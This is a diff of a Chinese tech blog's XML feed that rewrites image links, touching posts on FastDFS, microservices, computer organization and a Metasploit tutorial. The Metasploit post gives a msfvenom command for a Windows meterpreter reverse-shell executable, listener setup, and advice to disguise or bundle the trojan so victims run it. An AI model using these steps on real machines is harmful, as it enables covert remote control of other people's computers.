@@ -453,7 +453,7 @@
 <h3 id="1-1-4-安装fastdfs"><a href="#1-1-4-安装fastdfs" class="headerlink" title="1.1.4 安装fastdfs"></a>1.1.4 安装fastdfs</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf FastDFS_v5.08.tar.gz</span><br><span class="line"></span><br><span class="line">cd FastDFS</span><br><span class="line"></span><br><span class="line">./make.sh</span><br><span class="line"></span><br><span class="line">./make.sh install</span><br></pre></td></tr></table></figure>
 <p>如果安装成功，会看到/etc/init.d/下看到提供的脚本文件:</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ll /etc/init.d/ | grep fdfs</span><br></pre></td></tr></table></figure>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20211208-image-20211208141057992.png" alt="image-20211208141057992"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20211208-image-20211208141057992.png" alt="image-20211208141057992"></p>
 <ul>
 <li>fdfs_trackerd是tracker启动脚本</li>
 <li>fdfs_storaged是storage启动脚本</li>
@@ -493,7 +493,7 @@
 <p>设置开机启动</p>
 <figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">chkconfig fdfs_storaged <span class="keyword">on</span></span><br></pre></td></tr></table></figure>
 <p>ps -ef | grep fdfs</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20211208-image-20211208142953065.png" alt="image-20211208142953065"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20211208-image-20211208142953065.png" alt="image-20211208142953065"></p>
 ]]></content>
   </entry>
   <entry>
@@ -542,7 +542,7 @@
 <p>我的使用的是 时间戳+原名</p>
 <p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526180509507.png" alt="image-20210526180509507"></p>
 <p>gitee的配置图：</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210802-image-20210802231317873.png" alt="image-20210802231317873"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210802-image-20210802231317873.png" alt="image-20210802231317873"></p>
 <p>参考链接：<a href="https://segmentfault.com/a/1190000038610252">https://segmentfault.com/a/1190000038610252</a></p>
 <h1 id="3-Typora配置"><a href="#3-Typora配置" class="headerlink" title="3.Typora配置"></a>3.Typora配置</h1><p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/20210526-image-20210526180402751.png" alt="image-20210526180402751"></p>
 ]]></content>
@@ -1369,7 +1369,7 @@
     <url>/post/4cf34f0f.html</url>
     <content><![CDATA[<h1 id="1-什么是MSF"><a href="#1-什么是MSF" class="headerlink" title="1 什么是MSF"></a>1 什么是MSF</h1><p>Metasploit framework 简称msf，他是一个渗透测试平台，能够查找，利用和验证漏洞。</p>
 <p>Metasploit是一个免费的，可下载的框架，通过它可以很容易的对计算机软件漏洞实施攻击。它本身是附带数百个已知软件漏洞的专业级漏洞攻击工具。<span id="more"></span></p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png" alt="img"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png" alt="img"></p>
 <p>模块分为：</p>
 <p>辅助模块———————AUX</p>
 <p>渗透攻击模块————exploits</p>
@@ -1379,19 +1379,19 @@
 <p>空指令模块——————nops</p>
 <h1 id="2-基本使用方法"><a href="#2-基本使用方法" class="headerlink" title="2 基本使用方法"></a>2 基本使用方法</h1><ol>
 <li><p>在终端中输入<code>msfconsole</code>可以打开这个软件</p>
-<p>这里显示的是我们有多少个模块<img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20220324-image-20220324110431455.png" alt="image-20220324110431455"></p>
+<p>这里显示的是我们有多少个模块<img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20220324-image-20220324110431455.png" alt="image-20220324110431455"></p>
 </li>
 <li><p>常用命令</p>
 <p>| 常用命令      | 作用                           |<br>| ——————- | ——————————————— |<br>| connect IP    | 远程连接主机，一般用于内网渗透 |<br>| show exploits | 列出框架中所有的攻击渗透模块   |<br>| search _<em>_</em>  | 条件搜索                       |</p>
 <p>比如<code>search ms17_010</code>搜索这个漏洞</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20220324-image-20220324203338674.png" alt="image-20220324203338674"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20220324-image-20220324203338674.png" alt="image-20220324203338674"></p>
 <p>rank是等级，按可靠性降序排列</p>
 <p>excellent——-great—good—-normal—-average—-low—-manual</p>
 </li>
 </ol>
 <h1 id="3-生成可执行木马"><a href="#3-生成可执行木马" class="headerlink" title="3 生成可执行木马"></a>3 生成可执行木马</h1><ol>
 <li><p>命令：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=本地ip lport=本地端口号 -f exe -o 文件名.exe</code></p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20220325-image-20220325120742191.png" alt="image-20220325120742191"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20220325-image-20220325120742191.png" alt="image-20220325120742191"></p>
 </li>
 <li><p><code>msfconsole</code>打开msf</p>
 </li>
@@ -1402,7 +1402,7 @@
 <p>(4)命令： <code>set lport 1111</code>（填写刚才生成文件时的端口号）</p>
 <p>(5)命令： <code>show options</code>（查看设置参数）</p>
 <p>(6)命令： <code>exploit -z -j</code>（后台执行）</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20220325-image-20220325121212843.png" alt="image-20220325121212843"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20220325-image-20220325121212843.png" alt="image-20220325121212843"></p>
 </li>
 <li><p>在靶机打开可执行文件</p>
 <p>这里可以把程序伪装一下，改一下图标，或者把它捆绑在某些软件上面，当用户打开就自动安装到对方电脑上</p>
@@ -1410,7 +1410,7 @@
 <li><p>查看用户</p>
 <p>(1)命令：sessions（查看上钩用户）</p>
 <p>(2)命令：sessions -i 1（选择需要攻击的用户，这里选1）</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20220325-image-20220325121313086.png" alt="image-20220325121313086"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20220325-image-20220325121313086.png" alt="image-20220325121313086"></p>
 <p>出现meterpreter就已经成功了</p>
 </li>
 <li><p>meterpreter入侵对方电脑的命令</p>
@@ -1534,7 +1534,7 @@
 <li>调整蒙版，点击选择并遮住，进行调节，然后输出新建带有蒙版的图层</li>
 <li>使用画笔工具进行调节细节（44透明度，32流量）</li>
 </ol>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210806-image-20210806233802910.png" alt="image-20210806233802910" style="zoom: 80%;" /><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210806-image-20210806233821384.png" alt="image-20210806233821384" style="zoom: 80%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210806-image-20210806233802910.png" alt="image-20210806233802910" style="zoom: 80%;" /><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210806-image-20210806233821384.png" alt="image-20210806233821384" style="zoom: 80%;" /></p>
 ]]></content>
       <categories>
         <category>PS技巧</category>
@@ -3424,7 +3424,7 @@
     <url>/post/f2429f61.html</url>
     <content><![CDATA[<p>这个项目是关于图书管理的，并没有用到框架，只是一些IO流的操作，看这个项目是对IO流的一种复习。<span id="more"></span></p>
 <h1 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1 环境搭建"></a>1 环境搭建</h1><p>首先需要下载项目文件<a href="https://zuteducn-my.sharepoint.com/:u:/g/personal/201919154119_zut_edu_cn/EZbyh7886zRCqR7TLRPDbh0BFqr7VkBmadnIm2ko5p5cXw?e=kuMnfW">library</a>，之后在idea中创建一个空项目，将模块文件解压到该空项目文件夹里；在idea中导入刚才的项目文件夹，注意编码格式需要改为GBK</p>
-<h1 id="2-登陆代码分析"><a href="#2-登陆代码分析" class="headerlink" title="2 登陆代码分析"></a>2 登陆代码分析</h1><p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210827-image-20210827150530789.png" alt="image-20210827150530789" style="zoom:67%;" /></p>
+<h1 id="2-登陆代码分析"><a href="#2-登陆代码分析" class="headerlink" title="2 登陆代码分析"></a>2 登陆代码分析</h1><p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210827-image-20210827150530789.png" alt="image-20210827150530789" style="zoom:67%;" /></p>
 <p>在Login类里面通过</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FXML</span> <span class="keyword">private</span> TextField username;</span><br><span class="line"><span class="meta">@FXML</span> <span class="keyword">private</span> TextField password;</span><br></pre></td></tr></table></figure>
 <p>来获取登录界面里面用户输入的密码，之后enter()方法中的</p>
@@ -4046,10 +4046,10 @@
     <url>/post/8d4b7ae1.html</url>
     <content><![CDATA[<p>关于计算机组成原理的笔记<span id="more"></span></p>
 <h1 id="第1章"><a href="#第1章" class="headerlink" title="第1章"></a>第1章</h1><h2 id="1-1-计算机的基本组成"><a href="#1-1-计算机的基本组成" class="headerlink" title="1.1 计算机的基本组成"></a>1.1 计算机的基本组成</h2><p>导图：</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210831-image-20210831112446819.png" alt="image-20210831112446819" style="zoom:50%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210831-image-20210831112446819.png" alt="image-20210831112446819" style="zoom:50%;" /></p>
 <ol>
 <li><p>冯诺依曼机的结构</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210831-image-20210831111450011.png" alt="image-20210831111450011" style="zoom:50%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210831-image-20210831111450011.png" alt="image-20210831111450011" style="zoom:50%;" /></p>
 <p>冯诺依曼机的特点：</p>
 <p>（1）计算机由五大部件组成</p>
 <p>（2）指令和数据以同等地位存于存储器，可按地址寻访</p>
@@ -4059,24 +4059,24 @@
 <p>（6）以运算器为存储中心</p>
 </li>
 <li><p>现代计算机的结构</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210831-image-20210831112148255.png" alt="image-20210831112148255" style="zoom:50%;" /></p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210831-image-20210831112342426.png" alt="image-20210831112342426" style="zoom:67%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210831-image-20210831112148255.png" alt="image-20210831112148255" style="zoom:50%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210831-image-20210831112342426.png" alt="image-20210831112342426" style="zoom:67%;" /></p>
 </li>
 </ol>
 <h2 id="1-2-认识各个硬件部位"><a href="#1-2-认识各个硬件部位" class="headerlink" title="1.2 认识各个硬件部位"></a>1.2 认识各个硬件部位</h2><ol>
 <li><p>存储器</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210831-image-20210831112653206.png" alt="image-20210831112653206" style="zoom:50%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210831-image-20210831112653206.png" alt="image-20210831112653206" style="zoom:50%;" /></p>
 </li>
 <li><p>运算器</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210831-image-20210831112741125.png" alt="image-20210831112741125" style="zoom:50%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210831-image-20210831112741125.png" alt="image-20210831112741125" style="zoom:50%;" /></p>
 </li>
 <li><p>控制器</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210831-20210831-image-20210831112959576.png" style="zoom:50%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210831-20210831-image-20210831112959576.png" style="zoom:50%;" /></p>
 </li>
 </ol>
 <h2 id="1-3-计算机的工作过程"><a href="#1-3-计算机的工作过程" class="headerlink" title="1.3 计算机的工作过程"></a>1.3 计算机的工作过程</h2><p>比如一段代码是如何在计算机中工作的</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">2</span>, b=<span class="number">3</span>, c=<span class="number">1</span>,y=<span class="number">0</span>;</span><br><span class="line">    y=a*b+c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210831-image-20210831113330362.png" alt="image-20210831113330362" style="zoom:50%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210831-image-20210831113330362.png" alt="image-20210831113330362" style="zoom:50%;" /></p>
 <p>执行完之后PC会自动+1，执行接下来的指令</p>
 ]]></content>
       <categories>
@@ -4099,8 +4099,8 @@
 <p><strong>O2O 模式</strong></p>
 <p>O2O (Online To Offline)，也即将线下商务的机会与互联网结合在了一起，让互联网成为线下交易的前台。线上快速支付，线下优质服务。如：饿了么，美团，淘票票，京东到家</p>
 <h3 id="1-2-谷粒商城"><a href="#1-2-谷粒商城" class="headerlink" title="1.2 谷粒商城"></a>1.2 谷粒商城</h3><p>谷粒商城是一个B2C模式的电商平台，销售自营商品给用户。</p>
-<h2 id="2-项目架构图"><a href="#2-项目架构图" class="headerlink" title="2 项目架构图"></a>2 项目架构图</h2><h3 id="2-1-项目微服务架构图"><a href="#2-1-项目微服务架构图" class="headerlink" title="2.1 项目微服务架构图"></a>2.1 项目微服务架构图</h3><p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210802-image-20210802230644234.png" alt="image-20210802230644234"></p>
-<h3 id="2-2-微服务划分图"><a href="#2-2-微服务划分图" class="headerlink" title="2.2 微服务划分图"></a>2.2 微服务划分图</h3><p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210802-image-20210802230701663.png" alt="image-20210802230701663"></p>
+<h2 id="2-项目架构图"><a href="#2-项目架构图" class="headerlink" title="2 项目架构图"></a>2 项目架构图</h2><h3 id="2-1-项目微服务架构图"><a href="#2-1-项目微服务架构图" class="headerlink" title="2.1 项目微服务架构图"></a>2.1 项目微服务架构图</h3><p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210802-image-20210802230644234.png" alt="image-20210802230644234"></p>
+<h3 id="2-2-微服务划分图"><a href="#2-2-微服务划分图" class="headerlink" title="2.2 微服务划分图"></a>2.2 微服务划分图</h3><p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210802-image-20210802230701663.png" alt="image-20210802230701663"></p>
 <h2 id="3-项目技术和特色"><a href="#3-项目技术和特色" class="headerlink" title="3 项目技术和特色"></a>3 项目技术和特色</h2><ul>
 <li>前后端分离开发，并开发基于vue的后台管理系统</li>
 <li>SpringCloud全新的解决方案</li>
@@ -4121,8 +4121,8 @@
 <p>集群指的是将几台服务器集中在一起，实现同一业务。</p>
 <h2 id="3-远程调用"><a href="#3-远程调用" class="headerlink" title="3 远程调用"></a>3 远程调用</h2><p>在分布式系统中，各个服务可能处于不同主机，但是服务之间不可避免的要互相调用，我们称为远程调用。</p>
 <p>SpringCloud中使用Http+JSON的方式完成远程调用</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210802-image-20210802230741064.png" alt="image-20210802230741064"></p>
-<h2 id="4-负载均衡"><a href="#4-负载均衡" class="headerlink" title="4 负载均衡"></a>4 负载均衡</h2><p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210802-image-20210802230754055.png" alt="image-20210802230754055"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210802-image-20210802230741064.png" alt="image-20210802230741064"></p>
+<h2 id="4-负载均衡"><a href="#4-负载均衡" class="headerlink" title="4 负载均衡"></a>4 负载均衡</h2><p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210802-image-20210802230754055.png" alt="image-20210802230754055"></p>
 <p>分布式系统中，A服务需要调用B服务，B服务在多台机器中都存在，A调用任意一个服务器均可完成功能。为了使每一个服务器都不要太忙或者太闲，我们可以负载均衡的调用每一个服务器，提成网站的健壮性。</p>
 <p><strong>常见的负载均衡算法</strong></p>
 <ul>
@@ -4131,18 +4131,18 @@
 <li><strong>散列：</strong>根据请求源的IP的散列（hash）来选择要转发的服务器。这种方式可以一定程度上保证特定用户能连接到相同的服务器。如果你的应用需要处理状态而要求用户能连接到和之前相同的服务器，可以考虑采取这种方式。</li>
 </ul>
 <h2 id="5-服务注册-发现和注册中心"><a href="#5-服务注册-发现和注册中心" class="headerlink" title="5 服务注册/发现和注册中心"></a>5 服务注册/发现和注册中心</h2><p>A服务调用B服务，A服务并不知道B服务当前在哪几台服务器上有，哪些正常的，哪些服务已经下线。解决这个问题可以引入注册中心：</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210802-image-20210802230936129.png" alt="image-20210802230936129"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210802-image-20210802230936129.png" alt="image-20210802230936129"></p>
 <p>如果某些服务已经下线，我们其他人可以实时的感知到其他服务的状态，从而避免调用不可用的服务。</p>
-<h2 id="6-配置中心"><a href="#6-配置中心" class="headerlink" title="6 配置中心"></a>6 配置中心</h2><p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210802-image-20210802230944771.png" alt="image-20210802230944771"></p>
+<h2 id="6-配置中心"><a href="#6-配置中心" class="headerlink" title="6 配置中心"></a>6 配置中心</h2><p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210802-image-20210802230944771.png" alt="image-20210802230944771"></p>
 <p>每一个服务最终都有大量的配置，并且每个服务都可能部署在多台机器上。我们经常需要变更配置，我们可以让每个服务在配置中心获取自己的配置，用来集中管理微服务的配置信息。</p>
 <h2 id="7-服务熔断和服务降级"><a href="#7-服务熔断和服务降级" class="headerlink" title="7 服务熔断和服务降级"></a>7 服务熔断和服务降级</h2><p>在微服务架构中，微服务之间通过网络进行通信，存在相互依赖，当其中一个服务不可用时，有可能会造成雪崩效应。要防止这样的情况，必须要有容错机制来保护服务。</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210802-image-20210802231005050.png" alt="image-20210802231005050"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210802-image-20210802231005050.png" alt="image-20210802231005050"></p>
 <p>1、服务熔断</p>
 <p>设置服务超时，当被调用的服务经常失败到达某个阈值，我们可以开启断路保护机制，后来的请求不再去调用这个服务。本地直接返回默认的数据。</p>
 <p>2、服务降级</p>
 <p>在运维期间，当系统处于高峰期，系统资源紧张，我们可以让非核心业务降级运行。降级：某些服务部处理，或简单处理【抛异常、返回NULL、调用Mock数据、调用Fallback处理逻辑】</p>
 <h2 id="8-API网关"><a href="#8-API网关" class="headerlink" title="8 API网关"></a>8 API网关</h2><p>在微服务架构中，API Gateway作为整体架构的重要组件，它抽象了为服务中都需要的公共功能，同时提供了客户端负载均衡，服务自动熔断，灰度发布，统一认证，限流流控，日志统计等丰富的功能，帮助我们解决很多API管理难题。</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210802-image-20210802231025558.png" alt="image-20210802231025558"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210802-image-20210802231025558.png" alt="image-20210802231025558"></p>
 <h1 id="三-环境搭建"><a href="#三-环境搭建" class="headerlink" title="三 环境搭建"></a>三 环境搭建</h1><h2 id="1-创建项目微服务"><a href="#1-创建项目微服务" class="headerlink" title="1 创建项目微服务"></a>1 创建项目微服务</h2><p>商品服务，仓储服务，订单服务，优惠券服务，用户服务</p>
 <p>共同：</p>
 <p>1.web，openfeign</p>
@@ -4989,15 +4989,15 @@
 </ul>
 <h1 id="4-项目工程搭建"><a href="#4-项目工程搭建" class="headerlink" title="4 项目工程搭建"></a>4 项目工程搭建</h1><h2 id="4-1-父工程搭建"><a href="#4-1-父工程搭建" class="headerlink" title="4.1 父工程搭建"></a>4.1 父工程搭建</h2><p>创建项目类型为maven的父工程</p>
 <p>1.选择file-new project，选择maven，点击next</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210616-scYDB9.md.png" alt="scYDB9.md.png" style="zoom:67%;" /> </p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210616-scYDB9.md.png" alt="scYDB9.md.png" style="zoom:67%;" /> </p>
 <p>2.GroupId填写com.tensquare，ArtifacetId填写tensquare_parent，点击next</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210616-scYdcF.md.png" alt="scYdcF.md.png" style="zoom:67%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210616-scYdcF.md.png" alt="scYdcF.md.png" style="zoom:67%;" /></p>
 <p>3.点击Finash完成</p>
 <p>4.修改pom.xml文件，添加以下内容</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mybatisplus-spring-bootstarter.version</span>&gt;</span>1.0.5<span class="tag">&lt;/<span class="name">mybatisplus-spring-bootstarter.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mybatisplus.version</span>&gt;</span>2.2.0<span class="tag">&lt;/<span class="name">mybatisplus.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">fastjson.version</span>&gt;</span>1.2.39<span class="tag">&lt;/<span class="name">fastjson.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">gson.version</span>&gt;</span>2.8.0<span class="tag">&lt;/<span class="name">gson.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="4-2-搭建公共子模块"><a href="#4-2-搭建公共子模块" class="headerlink" title="4.2 搭建公共子模块"></a>4.2 搭建公共子模块</h2><h3 id="4-2-1-搭建子模块步骤"><a href="#4-2-1-搭建子模块步骤" class="headerlink" title="4.2.1 搭建子模块步骤"></a>4.2.1 搭建子模块步骤</h3><p>1.右键点击父工程tensquare_parent，选择New-&gt;Module弹出窗口选择Maven，点击next</p>
 <p>2.ArtifacetId填写tensquare_common，点击next</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210616-scYr7R.md.png" alt="scYr7R.md.png"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210616-scYr7R.md.png" alt="scYr7R.md.png"></p>
 <p>3.点击finish</p>
 <h3 id="4-2-1-创建公共实体类和工具类"><a href="#4-2-1-创建公共实体类和工具类" class="headerlink" title="4.2.1 创建公共实体类和工具类"></a>4.2.1 创建公共实体类和工具类</h3><p>1.新建com.tensquare.entity包，包下创建Result类，用于controller返回结果</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Result</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Boolean flag;<span class="comment">//是否成功</span></span><br><span class="line">    <span class="keyword">private</span> Integer code;<span class="comment">//返回码</span></span><br><span class="line">    <span class="keyword">private</span> String message;<span class="comment">//返回信息</span></span><br><span class="line">    <span class="keyword">private</span> Object data;<span class="comment">//返回数据</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Result</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Result</span><span class="params">(Boolean flag, Integer code, String message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = flag;</span><br><span class="line">        <span class="keyword">this</span>.code = code;</span><br><span class="line">        <span class="keyword">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Result&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;flag=&quot;</span> + flag +</span><br><span class="line">            <span class="string">&quot;, code=&quot;</span> + code +</span><br><span class="line">            <span class="string">&quot;, message=&#x27;&quot;</span> + message + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&quot;, data=&quot;</span> + data +</span><br><span class="line">            <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">getFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFlag</span><span class="params">(Boolean flag)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCode</span><span class="params">(Integer code)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.code = code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMessage</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setData</span><span class="params">(Object data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.data = data;</span><br><span class="line">    